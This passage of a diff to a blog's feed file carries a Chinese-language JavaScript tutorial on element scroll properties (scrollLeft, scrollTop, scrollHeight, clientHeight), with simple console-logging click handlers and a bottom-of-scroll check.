+ <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ascrollLeft=a.scrollLeft;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'ascrollLeft为'</span>+ascrollLeft)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'a元素滚动后距离左边的距离为'</span>+ascrollLeft)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> bscrollTop=b.scrollTop</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'bscrollTop为'</span>+bscrollTop)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'b元素滚动后距离顶部的距离为'</span>+bscrollTop)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试scrollLeft和scrollTop</span></span><br></pre></td></tr></table></figure></li>
+<li><p>scrollHeight,scrollTop,clientHeight之间的关系  </p>
+<p>浏览器要缩小到可以看到拖动吧条，因为我的浏览器还存在小数，所以用了四舍五入<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/round" target="_blank" rel="noopener">Math.round()</a></p>
+<ul>
+<li>分了两种情况：<ul>
+<li>4-1.当b元素竖直方向滚动到最下面的时候才相等</li>
+<li>4-2.当b元素竖直方向没有滚动到最下面，所以不相等 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 浏览器要缩小到可以看到拖动吧条，因为我的浏览器还存在小数，所以用了四舍五入。</span></span><br><span class="line"><span class="built_in">document</span>.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log(<span class="string">'b元素的整个高度为'</span>+b.scrollHeight)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'b元素的滚动的高度为'</span>+<span class="built_in">Math</span>.round(b.scrollTop))</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'b元素的可视范围高度为'</span>+b.clientHeight)</span><br><span class="line"><span class="comment">// 当b元素竖直方向滚动到最下面的时候才相等</span></span><br><span class="line">  <span class="keyword">if</span>((b.scrollHeight - <span class="built_in">Math</span>.round(b.scrollTop)) === b.clientHeight)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'当b元素竖直方向滚动到最下面的时候才相等'</span>)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'当b元素竖直方向没有滚动到最下面，所以不相等'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//scrollHeight,scrollTop,clientHeight之间的关系</span></span><br></pre></td></tr></table></figure>
+<h3 id="最后附上一个前端使用的大部分位置API的截图说明。"><a href="#最后附上一个前端使用的大部分位置API的截图说明。" class="headerlink" title="最后附上一个前端使用的大部分位置API的截图说明。"></a>最后附上一个前端使用的大部分位置API的截图说明。</h3><img src="https://s1.ax1x.com/2020/05/07/YZh89H.jpg" alt="YZh89H.jpg"></li>
+</ul>
+</li>
+</ul>
+<p>该截图来自于<a href="https://blog.csdn.net/caseywei/article/details/92644503" target="_blank" rel="noopener">Js——ScrollTop、ScrollHeight、ClientHeight、OffsetHeight汇总</a></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>JavaScript</category>
+      </categories>
       <tags>
         <tag>JavaScript</tag>
       </tags>
